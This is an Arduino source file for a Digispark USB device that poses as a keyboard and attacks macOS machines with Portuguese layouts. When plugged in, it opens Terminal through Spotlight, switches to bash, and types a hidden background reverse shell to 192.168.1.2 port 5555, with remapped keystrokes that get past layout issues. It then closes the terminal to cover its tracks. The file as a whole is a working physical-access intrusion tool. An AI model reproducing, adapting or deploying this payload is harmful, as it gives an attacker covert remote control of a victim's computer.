/*
  This is an example of reverse shell for OSX with bypass of ZSH issues.
  This code is for Portuguese (PT) layout keyboards.
  Using Digispark USB.
*/

#include "DigiKeyboard.h"

#define KEY_TAB     43
#define KEY_DELETE  76

void setup() {
}

//      pt
// = -> +
// + -> *
// * -> (
// ( -> )
// ) -> =
// & -> /
// / -> -
// - -> '
// ' -> ~
// ~ -> ±
// ± -> #
// ` -> §
// § -> $
// < -> ;
// > -> : 
// _ -> ?
// ? -> _
// ^ -> &
// [ -> º
// ] -> ´

// # -> #
// | -> |
// $ -> $

// DigiKeyboard.sendKeyStroke(100, MOD_SHIFT_LEFT); -> >
// DigiKeyboard.sendKeyStroke(100); -> <

void loop() {
  // Turn LED on begining
  digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  
  // Open OSX prompt
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  
  // Open terminal
  DigiKeyboard.print("terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  // Open bash (bypass ZSH)
  DigiKeyboard.print("bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // bash -i >& /dev/tcp/192.168.1.2/5555 0>&1& (extra & to run in background)
  DigiKeyboard.print("bash /i ");
  DigiKeyboard.sendKeyStroke(100, MOD_SHIFT_LEFT);
  DigiKeyboard.print("^ &dev&tcp&192.168.1.2&5555 0");
  DigiKeyboard.sendKeyStroke(100, MOD_SHIFT_LEFT);
  DigiKeyboard.print("^1^");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);

  DigiKeyboard.delay(100);
  
  // End of script, turn off led.
  digitalWrite(0, LOW);    
  digitalWrite(1, LOW); 
  
  for (;;) {
    /*empty*/
  }
}
